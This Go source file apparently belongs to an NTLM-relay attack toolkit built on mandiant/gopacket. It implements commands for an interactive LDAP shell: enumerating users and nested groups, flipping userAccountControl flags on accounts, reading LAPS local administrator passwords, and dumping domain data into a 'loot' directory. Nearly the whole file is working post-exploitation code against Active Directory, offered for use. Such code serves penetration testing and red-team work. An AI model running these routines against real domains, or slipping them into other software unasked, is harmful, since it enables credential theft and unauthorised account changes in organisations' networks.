// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package relay

import (
	"fmt"
	"net"
	"strconv"
	"strings"

	goldap "github.com/go-ldap/ldap/v3"

	gopacketldap "github.com/mandiant/gopacket/pkg/ldap"
	"github.com/mandiant/gopacket/pkg/security"
)

const ldapMatchingRuleInChain = "1.2.840.113556.1.4.1941"

func ldapShellResolveDN(client *gopacketldap.Client, baseDN, samAccountName string) (string, error) {
	if strings.Contains(samAccountName, ",") {
		return samAccountName, nil
	}
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(samAccountName)),
		[]string{"objectSid"})
	if err != nil {
		return "", err
	}
	if len(sr.Entries) == 0 {
		return "", fmt.Errorf("not found in LDAP: %s", samAccountName)
	}
	return sr.Entries[0].DN, nil
}

func ldapShellResolveSID(client *gopacketldap.Client, baseDN, samAccountName string) (*security.SID, error) {
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(samAccountName)),
		[]string{"objectSid"})
	if err != nil {
		return nil, err
	}
	if len(sr.Entries) == 0 {
		return nil, fmt.Errorf("not found in LDAP: %s", samAccountName)
	}
	raw := sr.Entries[0].GetRawAttributeValue("objectSid")
	if len(raw) == 0 {
		return nil, fmt.Errorf("empty objectSid for %s", samAccountName)
	}
	sid, _, err := security.ParseSIDBytes(raw)
	return sid, err
}

func ldapShellBuildEmptySD() *security.SecurityDescriptor {
	ownerSID, _ := security.ParseSID("S-1-5-32-544")
	return &security.SecurityDescriptor{
		Revision: 1,
		Control:  security.SE_DACL_PRESENT | security.SE_SELF_RELATIVE,
		Owner:    ownerSID,
		Group:    ownerSID,
		DACL: &security.ACL{
			AclRevision: 4,
		},
	}
}

func ldapShellToggleUAC(conn net.Conn, client *gopacketldap.Client, baseDN, userName string, flag int, enable bool) {
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(userName)),
		[]string{"objectSid", "userAccountControl"})
	if err != nil || len(sr.Entries) == 0 {
		fmt.Fprintf(conn, "Error: user not found: %s\n", userName)
		return
	}

	entry := sr.Entries[0]
	uacStr := entry.GetAttributeValue("userAccountControl")
	uac, _ := strconv.Atoi(uacStr)
	fmt.Fprintf(conn, "Original userAccountControl: %d\n", uac)

	if enable {
		uac = uac | flag
	} else {
		uac = uac &^ flag
	}

	modReq := goldap.NewModifyRequest(entry.DN, nil)
	modReq.Replace("userAccountControl", []string{strconv.Itoa(uac)})
	if err := client.Conn.Modify(modReq); err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "Updated userAccountControl attribute successfully\n")
}

func ldapShellSearch(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: search <query> [attribute ...]\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error getting base DN: %v\n", err)
		return
	}

	query := args[0]
	extraAttrs := args[1:]

	var filter string
	if strings.HasPrefix(query, "(") {
		filter = query
	} else {
		escaped := goldap.EscapeFilter(query)
		filter = fmt.Sprintf("(|(name=*%s*)(distinguishedName=*%s*)(sAMAccountName=*%s*))", escaped, escaped, escaped)
	}

	attributes := []string{"name", "distinguishedName", "sAMAccountName", "objectSid"}
	attributes = append(attributes, extraAttrs...)

	sr, err := client.Search(baseDN, filter, attributes)
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}

	for _, entry := range sr.Entries {
		fmt.Fprintf(conn, "%s\n", entry.DN)
		for _, attr := range attributes {
			if attr == "distinguishedName" {
				continue
			}
			val := entry.GetAttributeValue(attr)
			if val != "" {
				fmt.Fprintf(conn, "%s: %s\n", attr, val)
			}
		}
		if len(attributes) > 0 {
			fmt.Fprintf(conn, "---\n")
		}
	}
}

func ldapShellGetUserGroups(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: get_user_groups <user>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	userDN, err := ldapShellResolveDN(client, baseDN, args[0])
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	filter := fmt.Sprintf("(member:%s:=%s)", ldapMatchingRuleInChain, goldap.EscapeFilter(userDN))
	sr, err := client.Search(baseDN, filter, []string{"distinguishedName"})
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	for _, entry := range sr.Entries {
		fmt.Fprintf(conn, "%s\n", entry.DN)
	}
}

func ldapShellGetGroupUsers(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: get_group_users <group>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	groupDN, err := ldapShellResolveDN(client, baseDN, args[0])
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	filter := fmt.Sprintf("(memberof:%s:=%s)", ldapMatchingRuleInChain, goldap.EscapeFilter(groupDN))
	sr, err := client.Search(baseDN, filter, []string{"sAMAccountName", "name"})
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	for _, entry := range sr.Entries {
		fmt.Fprintf(conn, "%s\n", entry.DN)
		sam := entry.GetAttributeValue("sAMAccountName")
		if sam != "" {
			fmt.Fprintf(conn, "sAMAccountName: %s\n", sam)
		}
		name := entry.GetAttributeValue("name")
		if name != "" {
			fmt.Fprintf(conn, "name: %s\n", name)
		}
		fmt.Fprintf(conn, "---\n")
	}
}

func ldapShellGetLAPSPassword(conn net.Conn, client *gopacketldap.Client, args []string) {
	if len(args) == 0 {
		fmt.Fprintf(conn, "Usage: get_laps_password <computer>\n")
		return
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	sr, err := client.Search(baseDN,
		fmt.Sprintf("(sAMAccountName=%s)", goldap.EscapeFilter(args[0])),
		[]string{"ms-MCS-AdmPwd"})
	if err != nil || len(sr.Entries) == 0 {
		fmt.Fprintf(conn, "Error: computer not found: %s\n", args[0])
		return
	}
	entry := sr.Entries[0]
	fmt.Fprintf(conn, "Found Computer DN: %s\n", entry.DN)
	password := entry.GetAttributeValue("ms-MCS-AdmPwd")
	if password != "" {
		fmt.Fprintf(conn, "LAPS Password: %s\n", password)
	} else {
		fmt.Fprintf(conn, "Unable to Read LAPS Password for Computer\n")
	}
}

func ldapShellDump(conn net.Conn, client *gopacketldap.Client) {
	fmt.Fprintf(conn, "Dumping domain info...\n")
	cfg := &Config{LootDir: "loot"}
	if err := ldapDumpAttack(client, cfg); err != nil {
		fmt.Fprintf(conn, "Error: %v\n", err)
		return
	}
	fmt.Fprintf(conn, "Domain info dumped into lootdir!\n")
}
